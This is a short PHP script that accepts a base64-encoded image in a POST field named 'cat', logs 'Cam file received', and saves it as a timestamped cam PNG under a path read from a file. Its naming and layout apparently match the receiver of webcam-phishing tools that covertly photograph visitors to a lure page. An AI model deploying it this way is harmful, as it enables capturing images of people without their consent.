<?php

// Get the current date for the filename
$date = date('dMYHis');

// Check if 'cat' key exists in POST data
if (!empty($_POST['cat'])) {
    error_log("[#] Cam file received" . PHP_EOL, 3, "Log.log");

    // Read the path from the file
    $myPath = file_get_contents("path.txt");

    // Extract the base64 encoded image data
    $filteredData = substr($_POST['cat'], strpos($_POST['cat'], ",") + 1);

    // Decode the base64 data
    $unencodedData = base64_decode($filteredData);

    // Construct the file name with path
    $myFile = $myPath . 'cam' . $date . '.png';

    // Write the decoded data to a file
    if (file_put_contents($myFile, $unencodedData) === false) {
        error_log("[!] Failed to write to file: $myFile" . PHP_EOL);
    }
}

// Exit the script
exit();

?>
